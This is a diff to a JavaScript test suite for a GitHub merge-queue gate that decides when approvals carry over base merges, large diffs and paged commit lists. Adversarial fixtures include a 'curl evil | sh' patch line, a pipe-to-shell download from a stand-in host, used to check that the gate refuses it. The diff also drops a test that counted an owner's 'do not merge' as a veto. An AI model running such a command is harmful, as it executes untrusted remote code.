+  assert.equal(sameNetChange(LISTED, LISTED, [DIFF_TEXT, `${DIFF_TEXT}diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n`]), false, "a file more");
+  const none = { files: [] };
+  const modeOnly = (mode) => `diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode ${mode}\n`;
+  assert.equal(sameNetChange(none, none, [modeOnly("100755"), modeOnly("100755")]), true);
+  assert.equal(sameNetChange(none, none, [modeOnly("100755"), modeOnly("120000")]), false, "a mode the listing never reports");
+  const binary = "diff --git a/logo.png b/logo.png\nindex 1..2 100644\nBinary files a/logo.png and b/logo.png differ\n";
+  assert.equal(sameNetChange(none, none, [binary, binary]), false, "a binary change shows no patch to compare");
+  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN], [DIFF_TEXT, DIFF_TEXT], 301), true);
+  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN]), false);
+});
+
+test("two diffs cut short of the pull request's changed files, or of the files their listings name, carry nothing", () => {
+  const one = cutShort(DIFF_TEXT, 1);
+  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN], [one, one], 301), false, "300 files against 301 changed");
+  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN], [DIFF_TEXT, DIFF_TEXT]), false, "no changed-file count");
+  const two = cutShort(DIFF_TEXT, 2);
+  assert.equal(sameNetChange(LISTED, LISTED, [two, two]), false, "a diff missing a file the listing names");
+});
+
+test("wholeCompare pages the commits past the unpaged 250 and reads the files from the diff past 300", async () => {
+  const reads = [];
+  const read = async (path) => {
+    reads.push(path);
+    return { "/c/a...b?per_page=100&page=1": LISTED, "/c/a...b?per_page=100&page=2": PAGE_TWO }[path];
+  };
+  const whole = await wholeCompare(read, async (path) => (reads.push(`diff ${path}`), DIFF_TEXT), "/c/a...b");
+  assert.equal(whole.total_commits, 150);
+  assert.equal(whole.commits.length, 150);
+  assert.deepEqual(whole.commits, [...LISTED.commits, ...PAGE_TWO.commits]);
+  assert.equal(whole.files.length, 301);
+  assert.deepEqual(reads, ["/c/a...b?per_page=100&page=1", "/c/a...b?per_page=100&page=2", "diff /c/a...b"]);
+  const pages = [];
+  const short = await wholeCompare(async (path) => (pages.push(path), path.endsWith("page=1") ? LISTED : { commits: PAGE_TWO.commits.slice(1) }), async () => DIFF_TEXT, "/c/a...b");
+  assert.equal(short.commits.length, 149, "a page short of the total stays short");
+  assert.equal(pages.length, 2, "the read stops at a page short of 100");
+  await assert.rejects(wholeCompare(async (path) => (path.endsWith("page=1") ? LISTED : PAGE_TWO), async () => "not a diff", "/c/a...b"), /does not parse/);
+  await assert.rejects(wholeCompare(async (path) => (path.endsWith("page=1") ? LISTED : PAGE_TWO), async () => cutShort(DIFF_TEXT, 2), "/c/a...b"), /names fewer files than its listing/);
+  assert.deepEqual(diffFiles(""), []);
+  await assert.rejects(wholeCompare(async (path) => (path.endsWith("page=1") ? LISTED : PAGE_TWO), async () => "", "/c/a...b"), /names fewer files than its listing/, "an empty diff body");
+  const small = { ...PAGE_TWO, total_commits: 50, files: [TF] };
+  assert.deepEqual(await wholeCompare(async () => small, async () => assert.fail("a listing under 300 needs no diff"), "/c/a...b"), small);
 });
 
 test("linkHold binds a pass to the issue and link kind it judged", () => {
@@ -982,9 +1059,6 @@ test("evidenceHold holds a report it cannot read, or one for another head", () =
   }
 });
 
-// GitHub turns auto-merge off only on a push by someone without write access,
-// so a lane push after enable-auto-merge armed the pull request leaves the
-// arm on: the queue holds the pushed head, which the pin does not name.
 const pinRow = (sha, at) => ({ id: 3, node_id: "IC_7", user: { login: "melodic-automation-lanes[bot]", id: 9, type: "Bot" }, body: `<!-- babysit-merge-pin sha=${sha} rung=C2 -->\nArmed.`, created_at: at, author_association: "NONE" });
 const PIN_HELD = /^::error::#99: its head is not fedcba9876543210fedcba9876543210fedcba98, the head the lanes App pinned when it armed auto-merge, so the arm's checks never judged this head;/m;
 
@@ -1046,6 +1120,25 @@ test("pinHold reads the lanes App's newest pin", async () => {
   assert.equal(PIN_RE.exec(`<!-- babysit-merge-pin sha=${HEAD} -->`)[1], HEAD);
 });
 
+test("a lanes App unpin ends the pin only on a pull request that is not the lanes App's", async () => {
+  const unpinRow = { ...pinRow(HEAD, "2026-10-23T10:00:00Z"), node_id: "IC_8", body: `<!-- babysit-merge-unpin sha=${HEAD} -->\nUnpinned.` };
+  const items = [pinRow(OLD, "2026-10-23T09:00:00Z"), unpinRow].map((row) => ({ ...fromRest(row), lastEditedAt: null }));
+  assert.match(pinHold(items, HEAD) ?? "", /^its head is not fedcba98/, "on the lanes App's own pull request the unpin is ignored and the old pin holds the moved head");
+  assert.equal(pinHold(items, HEAD, { unpins: true }), null, "on a trusted person's pull request the newest unpin ends the pin");
+  const asked = [];
+  const github = async (method, path, body) => {
+    asked.push(body.variables.id);
+    return { data: { node: { lastEditedAt: null } } };
+  };
+  const unread = items.map(({ lastEditedAt, ...item }) => item);
+  assert.match(pinHold(await withPinEdit(github, unread), HEAD) ?? "", /^its head is not fedcba98/, "the lanes App path reads the edit time of the pin it judges");
+  assert.equal(pinHold(await withPinEdit(github, unread, { unpins: true }), HEAD, { unpins: true }), null, "the trusted path reads the edit time of the unpin it judges");
+  assert.deepEqual(asked, ["IC_7", "IC_8"], "each path reads the edit time of the record it judges");
+  const queuedRun = await queued(report(null), [pinRow(OLD, "2026-10-23T09:00:00Z"), unpinRow]);
+  assert.equal(queuedRun.code, 1, queuedRun.out);
+  assert.match(queuedRun.out, PIN_HELD, "the lanes App's queued pull request with a newer unpin is still held on its older pin");
+});
+
 test("in the merge queue, a reader with no FAIL hold lets a passed head through", async () => {
   const { code, out } = await queued(report(null));
   assert.equal(code, 0, out);
@@ -1100,9 +1193,9 @@ test("in the merge queue, the lanes App's configured baseline file needs no veri
     assert.doesNotMatch(held.out, /changes only docs\/upstream/);
   }
   const veto = { user: { login: "owner-person", id: 5, type: "User" }, body: "do not merge", created_at: "2026-10-23T11:00:00Z", author_association: "OWNER" };
-  const vetoed = await ci([BASELINE], { pull: lanes, reviews: [veto], queue: { verdicts: [], link: { record: null, closing: { totalCount: 0, nodes: [] } }, evidence: report(null) } });
-  assert.equal(vetoed.code, 1, vetoed.out);
-  assert.doesNotMatch(vetoed.out, /no member veto/);
+  const commented = await ci([BASELINE], { pull: lanes, reviews: [veto], queue: { verdicts: [], link: { record: null, closing: { totalCount: 0, nodes: [] } }, evidence: report(null) } });
+  assert.equal(commented.code, 0, commented.out);
+  assert.match(commented.out, /^#99: no member veto and no hold path\.$/m);
 });
 
 test("in the merge queue, a pass the linked issue changed after holds until pr-verify judges the head again", async () => {
@@ -1171,16 +1264,6 @@ test("in the merge queue, a missing or unreadable reader report holds", async ()
   }
 });
 
-// A hold path's approval survives a base merge (the churn measured on
-// #10224): a trusted person's approving review of a head lifts a later head
-// only when every commit since is a merge of commits the base holds
-// (baseMergesOnly) and the net change against the base's tip is the same
-// over every file (sameNetChange), or the merges brought exactly the base's
-// changes (exactBaseCarry). The base is read once by its full ref (baseTip),
-// and every compare against it names its tip commit. A label removal never
-// lifts a hold path, and a dismissed approval counts only when GitHub
-// dismissed it as stale on a base merge's push. Every adversarial shape
-// keeps the hold.
 const HELD = ".github/actions/resolve-config/live-config.test.mjs";
 const HELD_PATCH = { filename: HELD, status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
 const OTHER_HELD = { filename: ".github/actions/resolve-config/resolve.test.mjs", status: "modified", patch: "@@ -1 +1 @@\n-c\n+d" };
@@ -1224,12 +1307,24 @@ const liftWorld = ({
   events = [],
   activity = [push(HEAD, "2026-10-27T23:32:00Z"), push(OLD, "2026-10-27T23:00:00Z")],
   fail = "",
+  diffs = {},
 } = {}) => {
   const reads = [];
-  const github = async (method, path) => {
-    reads.push(path);
+  const github = async (method, path, body, headers = {}) => {
+    reads.push(headers.Accept === DIFF ? `diff ${path}` : path);
     assert.equal(method, "GET");
     if (fail && path.includes(fail)) throw new Error(`${fail} failed`);
+    if (headers.Accept === DIFF) {
+      const [, from, head] = /^\/repos\/owner\/repo\/compare\/([0-9a-f]{40})\.\.\.([0-9a-f]{40})$/.exec(path) ?? [];
+      const key = from === TIP ? head : `${from}...${head}`;
+      if (key in diffs) return diffs[key];
+      throw new Error(`unexpected diff read ${path}`);
+    }
+    const paged = /^(\/repos\/owner\/repo\/compare\/[^?]+)\?per_page=100&page=([0-9]+)$/.exec(path);
+    const page = paged ? Number(paged[2]) : 0;
+    if (paged) path = paged[1];
+    const cut = (answer) =>
+      Array.isArray(answer?.commits) ? { ...answer, commits: page ? answer.commits.slice((page - 1) * 100, page * 100) : answer.commits.slice(0, 250) } : answer;
     if (path === "/repos/owner/repo/pulls/99") return { head: { sha: HEAD, ref: "fix/cost", repo: { full_name: fork ? "someone/repo" : REPO } }, base: { ref: base }, changed_files: changed ?? compares[HEAD]?.files?.length };
     if (path === "/repos/owner/repo") {
       if (defaultBranch === null) throw new Error("the repository did not read");
@@ -1245,9 +1340,9 @@ const liftWorld = ({
     const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
     if (parent) return { status: bases[parent[1]] ?? "diverged" };
     const compare = new RegExp(`^/repos/owner/repo/compare/${TIP}\\.\\.\\.([0-9a-f]{40})$`).exec(path);
-    if (compare && compare[1] in compares) return compares[compare[1]];
+    if (compare && compare[1] in compares) return cut(compares[compare[1]]);
     const range = /^\/repos\/owner\/repo\/compare\/([0-9a-f]{40}\.\.\.[0-9a-f]{40})$/.exec(path);
-    if (range && range[1] in across) return across[range[1]];
+    if (range && range[1] in across) return cut(across[range[1]]);
     throw new Error(`unexpected read ${path}`);
   };
   return { github, reads };
@@ -1292,6 +1387,77 @@ test("an approval of an earlier head lifts a hold path over a later base merge, 
   }
 });
 
+test("an approval carries over a base merge whose compares list 300 files, judged on their two diffs", async () => {
+  const humans = new Set([5]);
+  const capped = (diffs) => liftWorld({ compares: { [OLD]: atOld(LISTED.files), [HEAD]: merged(LISTED.files) }, across: {}, changed: 301, diffs });
+  const same = capped({ [OLD]: DIFF_TEXT, [HEAD]: DIFF_TEXT });
+  assert.deepEqual(await holdsModule.liftersOf(same.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: ["owner-person"] });
+  assert.ok(same.reads.includes(`diff /repos/owner/repo/compare/${TIP}...${OLD}`) && same.reads.includes(`diff /repos/owner/repo/compare/${TIP}...${HEAD}`), same.reads.join(" "));
+  const evil = capped({ [OLD]: DIFF_TEXT, [HEAD]: bumped(DIFF_TEXT) });
+  assert.deepEqual(await holdsModule.liftersOf(evil.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: [] }, "a merge that changes one line");
+  const short = liftWorld({ compares: { [OLD]: atOld(LISTED.files), [HEAD]: merged(LISTED.files) }, across: {}, changed: 302, diffs: { [OLD]: DIFF_TEXT, [HEAD]: DIFF_TEXT } });
+  assert.deepEqual(await holdsModule.liftersOf(short.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: [] }, "a diff naming fewer files than the pull request changes");
+});
+
+test("an approval carries over a base merge whose ranges run past 250 commits, read in pages, and a page cut short carries nothing", async () => {
+  const humans = new Set([5]);
+  const branch = chain(259, MAIN).map((commit, at) => (at === 258 ? { ...commit, sha: OLD } : commit));
+  const then = { ...atOld(), commits: branch, total_commits: 259 };
+  const now = { ...merged([HELD_PATCH]), commits: [...branch, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }], total_commits: 260 };
+  const lifts = (compares) => holdsModule.liftersOf(liftWorld({ compares }).github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP });
+  assert.deepEqual(await lifts({ [OLD]: then, [HEAD]: now }), { lifters: ["owner-person"] });
+  assert.deepEqual(await lifts({ [OLD]: then, [HEAD]: { ...now, total_commits: 261 } }), { lifters: [] }, "a page shorter than total_commits");
+});
+
+test("the exact carry judges merges past 300 files on the two ranges' diffs, and fails closed on a diff that differs or does not read", async () => {
+  const humans = new Set([5]);
+  const paths = diffFiles(DIFF_TEXT).flatMap((f) => (f.status === "removed" ? [] : [[f.filename]]));
+  const wide = (diffs) =>
+    liftWorld({
+      ...REPLAY,
+      across: ranges(brought(LISTED.files, { commits: [...chain(259, MAIN), { sha: HEAD }], total_commits: 260 }), baseRange(LISTED.files)),
+      modes: trees(treeOf(paths), treeOf(paths)),
+      diffs,
+    });
+  const lifts = (world) => holdsModule.liftersOf(world.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP });
+  const same = wide({ [`${OLD}...${HEAD}`]: DIFF_TEXT, [`${MB_OLD}...${MB_HEAD}`]: DIFF_TEXT });
+  assert.deepEqual(await lifts(same), { lifters: ["owner-person"] });
+  assert.ok(same.reads.includes(`diff /repos/owner/repo/compare/${OLD}...${HEAD}`), same.reads.join(" "));
+  assert.deepEqual(await lifts(wide({ [`${OLD}...${HEAD}`]: DIFF_TEXT, [`${MB_OLD}...${MB_HEAD}`]: bumped(DIFF_TEXT) })), { lifters: [] }, "one changed line");
+  assert.deepEqual(await lifts(wide({ [`${OLD}...${HEAD}`]: DIFF_TEXT })), { lifters: [] }, "a diff that does not read");
+  const short = cutShort(DIFF_TEXT, 2);
+  assert.deepEqual(await lifts(wide({ [`${OLD}...${HEAD}`]: short, [`${MB_OLD}...${MB_HEAD}`]: short })), { lifters: [] }, "diffs naming fewer files than the listing");
+});
+
+test("Q10 past 300 files: the push is judged on its diff, and a held file the listing hides past 300 refuses", async () => {
+  const docs = (n, extra = "") => modifiedAs(Array.from({ length: n }, (_, i) => `docs/${i}.md`)) + extra;
+  const many = pushed(Array.from({ length: 300 }, (_, i) => `docs/${i}.md`));
+  const hidden = modifiedAs([".github/workflows/x.yml"]);
+  assert.equal(ungatedSince(many, [], docs(301)), true);
+  assert.equal(approvalCarry(null, null, H0, [], many, null, null, null, [], null, [docs(301), null]), true);
+  for (const [name, diff] of [
+    ["no diff", null],
+    ["a diff that does not parse", "not a diff"],
+    ["a diff naming fewer files than the listing", docs(299)],
+    ["a workflow the listing hides past 300", docs(300, hidden)],
+  ]) {
+    assert.equal(ungatedSince(many, [], diff), false, name);
+  }
+  assert.equal(ungatedSince(many, ["docs/7.md"], docs(301)), false, "a configured hold path inside the diff");
+  const humans = new Set([5]);
+  const world = liftWorld({
+    compares: { [OLD]: atOld(), [HEAD]: { ...merged([HELD_PATCH]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 } },
+    across: { [`${OLD}...${HEAD}`]: { ...many, commits: [{ sha: HEAD }] } },
+    diffs: { [`${OLD}...${HEAD}`]: docs(301) },
+  });
+  assert.deepEqual(await holdsModule.liftersOf(world.github, REPO, 99, HEAD, humans, [], { mainTip: TIP }), { lifters: ["owner-person"] });
+  const unread = liftWorld({
+    compares: { [OLD]: atOld(), [HEAD]: { ...merged([HELD_PATCH]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 } },
+    across: { [`${OLD}...${HEAD}`]: { ...many, commits: [{ sha: HEAD }] } },
+  });
+  assert.deepEqual(await holdsModule.liftersOf(unread.github, REPO, 99, HEAD, humans, [], { mainTip: TIP }), { lifters: [] }, "a diff that does not read");
+});
+
 test("liftersOf takes main's tip the caller already resolved, and reads it only for another base or no tip", async () => {
   const humans = new Set([5]);
   const tipReads = (world) => world.reads.filter((path) => path.includes("/git/ref/")).length;
@@ -1309,14 +1475,8 @@ test("liftersOf takes main's tip the caller already resolved, and reads it only 
   }
 });
 
-// The owner's decision on #10596: a trusted person's label removal lifts no
-// hold path, at the head or before a base merge, and a dismissed approval
-// never counts, even one GitHub dismissed as stale on a push. The lanes App
-// put the label on at 23:05; the person removed it at 23:26:14.
 const LABEL = (event, at, id, login, app = null) => ({ event, label: { name: "needs-human" }, actor: { id, login }, performed_via_github_app: app, created_at: at });
 const REMOVAL = [LABEL("labeled", "2026-10-27T23:05:00Z", 2, "lanes[bot]", { slug: "lanes" }), LABEL("unlabeled", APPROVED_AT, 5, "owner-person")];
-// GitHub's own stale-review dismissal on the base merge's push, as #10224's
-// timeline shows it: the pushing App as actor, no message, the pushed commit.
 const STALE = {
   event: "review_dismissed",
   actor: { id: 2, login: "lanes[bot]", type: "Bot" },
@@ -1389,13 +1549,6 @@ test("a dismissal with a message, by a person, or not by the push the carry chec
   }
 });
 
-// The owner's decision of 2026-10-28 (part b): when the net change differs
-// because the base changed a file the pull request also changes (#10224's
-// shape), the approval carries only when what the merges brought into the
-// approved head (OLD...HEAD) is, file for file, what the base changed between
-// the two merge bases (MB_OLD...MB_HEAD): identical status and patch.
-// #10224's own patches: the pull request's hunks sit lower in the shared
-// file, so the base's hunk applies with the same header and context.
 const SHARED_AT_OLD = { filename: ".github/actions/collect-base-activity/collect-base-activity.test.mjs", status: "modified", patch: "@@ -93,6 +93,13 @@ let root;\n context\n+mine" };
 const SHARED_AT_HEAD = { ...SHARED_AT_OLD, patch: "@@ -98,6 +98,13 @@ let root;\n context\n+mine" };
 const SHARED_BASE = { filename: SHARED_AT_OLD.filename, status: "modified", patch: "@@ -10,6 +10,11 @@ import\n+theirs" };
@@ -1432,8 +1585,8 @@ test("a merge that adds anything beyond the base's changes, or a range not read 
     "a non-merge commit beside the merge": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
       compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: OLD }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OTHER }] }], total_commits: 3 } },
     }),
-    "300 files brought": shape(brought(many), baseRange(many)),
-    "300 files in the base's range": shape(brought([BASE_DOC, SHARED_BASE]), baseRange(many)),
+    "300 files brought whose diffs do not read": shape(brought(many), baseRange(many)),
+    "300 files in the base's range whose diffs do not read": shape(brought([BASE_DOC, SHARED_BASE]), baseRange(many)),
     "a brought file with no patch": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: undefined }]), baseRange([BASE_DOC, { ...SHARED_BASE, patch: undefined }])),
     "a brought commit list cut short": shape(brought([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
     "a base range commit list cut short": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
@@ -1461,8 +1614,6 @@ test("no adversarial history, approval or reviewer carries a lift to the head", 
       across: ranges(brought([BASE_DOC, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
     },
     "a merge that adds a hold path": { compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, OTHER_HELD]) }, across: ranges(brought([BASE_DOC, OTHER_HELD])) },
-    // The re-review of #10596: a merge that rewrites a non-hold file the
-    // approved head already changed, or adds one, writes a change of its own.
     "a merge that rewrites scripts/helper.sh, which the approved head changed": {
       compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "@@ -1 +1 @@\n-x\n+curl evil | sh" }]) },
       across: ranges(brought([BASE_DOC, { ...HELPER, patch: "@@ -1 +1 @@\n-y\n+curl evil | sh" }])),
@@ -1524,10 +1675,6 @@ test("an approval carried over a base merge lifts no verifier hold, and an exact
   assert.deepEqual(world.reads, []);
 });
 
-// The independent security review of #10671: the compare API reports no
-// file mode, so the exact path reads the head's and its merge base's trees and
-// requires each brought file's mode to be the base's; and the carry runs only
-// on a base that is the repository's default branch.
 test("the exact carry reads file modes from the trees, and a non-default base carries nothing", async () => {
   const flipped = FILES_AT.map(([path]) => [path, path === "docs/base.md" ? "100755" : "100644"]);
   const heldFlip = FILES_AT.map(([path]) => [path, path === SHARED_AT_OLD.filename ? "100755" : "100644"]);
@@ -1611,11 +1758,6 @@ test("exactBaseCarry, approvalCarry and autoDismissed read their inputs strictly
   assert.deepEqual([...autoDismissed("not a list")], []);
 });
 
-// The owner's decision Q10 of 2026-10-28, verbatim in #10759: "go w/
-// recommendations". An approval of H0 stays valid at H1 when the diff H0...H1
-// touches no hold-path file; a push that touches one needs a new approval,
-// a test-only or comment-only edit included. The peer review of #10737 adds
-// the files hold paths load (REVIEW_FLOOR, CARRY_REFUSES).
 const H0 = "a".repeat(40);
 const H1 = "b".repeat(40);
 const pushed = (files, extra = {}) => ({ status: "ahead", behind_by: 0, files: files.map((filename) => ({ filename, status: "modified", patch: "+x" })), commits: [{ sha: H1 }], total_commits: 1, ...extra });
@@ -1662,10 +1804,6 @@ test("Q10: a compare not read whole, not ahead, or with a dismissal the push did
   assert.equal(carriesQ10(pushed(["docs/a.md"]), null), false, "unread hold paths");
 });
 
-// The queue holds select-tests checks before the lanes (#10747). Expected
-// reasons are ci-status's own error texts for the same holds: its hold-label
-// step's three label errors, its pr-unblock step's error and its lanes App
-// step's kill-switch error, which reconcile.test.mjs keys on.
 const QUEUED = "fedcba9876543210fedcba9876543210fedcba98";
 const queuedPull = (over = {}) => ({ number: 7, head: { sha: QUEUED }, labels: [], user: { id: 42, type: "User" }, ...over });
 const ON = { appId: "99", disabled: "false", repoDisabled: "false" };
@@ -1760,25 +1898,62 @@ test("queueHolds: a pull request or label list that does not read throws", () =>
   assert.throws(() => holdsModule.queueHolds({ pull: queuedPull({ labels: null }) }), /labels are not a list/);
 });
 
-test("a member naming the do-not-merge label is no veto; saying not to merge is", () => {
-  const said = (body) => [{ login: "kyle-sexton", isUser: true, association: "OWNER", at: "2026-10-30T01:00:00Z", body }];
-  for (const body of [
-    "Apply the `do-not-merge` label before writing any explanation.",
-    "Removed the do-not-merge label; the hold reason is gone.",
-  ]) {
-    assert.deepEqual(holdsModule.vetoers(said(body)), [], body);
+test("authorSkip judges an author as resolve-pr.mjs and ci-status's queue author checks did", () => {
+  const OWNERS = [153232337, 337859524];
+  const LANE_ID = "melodic-automation-lanes[bot]";
+  const LANE = { id: 337595936, login: LANE_ID, type: "Bot" };
+  const LANE_SPELLED = { id: 337595936, login: "Melodic-Automation-Lanes", type: "Bot" };
+  const LANE_NAMED_USER = { id: 1, login: "melodic-automation-lanes", type: "User" };
+  const OWNER = { id: 153232337, login: "kyle-sexton", type: "User" };
+  const OWNER_LOGIN_OTHER_ID = { id: 153232338, login: "kyle-sexton", type: "User" };
+  const LISTED_BOT = { id: 337859524, login: "melodic-release[bot]", type: "Bot" };
+  const LISTED_ORG = { id: 153232337, login: "kyle-sexton", type: "Organization" };
+  const HUMAN = { id: 2, login: "someone", type: "User" };
+  const DEPENDABOT = { id: 49699333, login: "dependabot[bot]", type: "Bot" };
+  const RENOVATE_APP = { id: 3, login: "app/renovate", type: "Bot" };
+  const DEPENDABOT_USER = { id: 5, login: "dependabot", type: "User" };
+  const LISTED_DEPENDABOT = { id: 153232337, login: "dependabot[bot]", type: "Bot" };
+  const NO_LOGIN_BOT = { id: 6, login: null, type: "Bot" };
+  const rows = [
+    [LANE, "lane", LANE_ID, null],
+    [LANE, "lane-or-owner", LANE_ID, null],
+    [LANE, "any", LANE_ID, null],
+    [LANE_SPELLED, "lane", LANE_ID, null],
+    [LANE_SPELLED, "lane-or-owner", LANE_ID, null],
+    [LANE_NAMED_USER, "lane", LANE_ID, "author-not-lane"],
+    [LANE_NAMED_USER, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
+    [LANE_NAMED_USER, "any", LANE_ID, null],
+    [OWNER, "lane", LANE_ID, "author-not-lane"],
+    [OWNER, "lane-or-owner", LANE_ID, null],
+    [OWNER, "any", LANE_ID, null],
+    [OWNER_LOGIN_OTHER_ID, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
+    [LISTED_BOT, "lane", LANE_ID, "author-not-lane"],
+    [LISTED_BOT, "lane-or-owner", LANE_ID, null],
+    [LISTED_ORG, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
+    [LISTED_ORG, "any", LANE_ID, null],
+    [HUMAN, "lane", LANE_ID, "author-not-lane"],
+    [HUMAN, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
+    [HUMAN, "any", LANE_ID, null],
+    [DEPENDABOT, "any", LANE_ID, "dependency-manager"],
+    [RENOVATE_APP, "lane-or-owner", LANE_ID, "dependency-manager"],
+    [DEPENDABOT_USER, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
+    [DEPENDABOT_USER, "any", LANE_ID, null],
+    [LISTED_DEPENDABOT, "lane-or-owner", LANE_ID, "dependency-manager"],
+    [NO_LOGIN_BOT, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
+    [NO_LOGIN_BOT, "any", LANE_ID, null],
+    [LANE, "everyone", LANE_ID, "verify-authors-invalid"],
+    [OWNER, "everyone", LANE_ID, "verify-authors-invalid"],
+    [LANE, "- lane", LANE_ID, "verify-authors-invalid"],
+    [OWNER, "", LANE_ID, "verify-authors-invalid"],
+    [LANE, "Lane", LANE_ID, "verify-authors-invalid"],
+    [LANE, "lane", "", "author-not-lane"],
+    [LANE, "lane", " Melodic-Automation-Lanes ", null],
+    [LANE, "lane", "melodic-release[bot]", "author-not-lane"],
+    [NO_LOGIN_BOT, "lane", "", "author-not-lane"],
+    [LISTED_BOT, "lane", "melodic-release[bot]", null],
+  ];
+  for (const [user, mode, identity, want] of rows) {
+    assert.equal(holdsModule.authorSkip(user, mode, identity, OWNERS), want, JSON.stringify({ user, mode, identity }));
   }
-  for (const body of [
-    "Do not merge this yet.",
-    "don't merge",
-    "do-not-merge",
-    "do-not-merge: waiting on #10954",
-    "Not ready, do-not-merge until Friday.",
-    "The checks are failing, do-not-merge until they pass.",
-    "`do-not-merge` label please",
-    "Hold on, do-not-merge, I'm still reviewing.",
-    "Every hold stays: ci-status, gitleaks, do-not-merge, cost holds.",
-  ]) {
-    assert.deepEqual(holdsModule.vetoers(said(body)), ["kyle-sexton"], body);
-  }
+  assert.equal(holdsModule.authorSkip(OWNER, "lane-or-owner", LANE_ID, []), "author-not-lane-or-owner", "an empty list");
 });
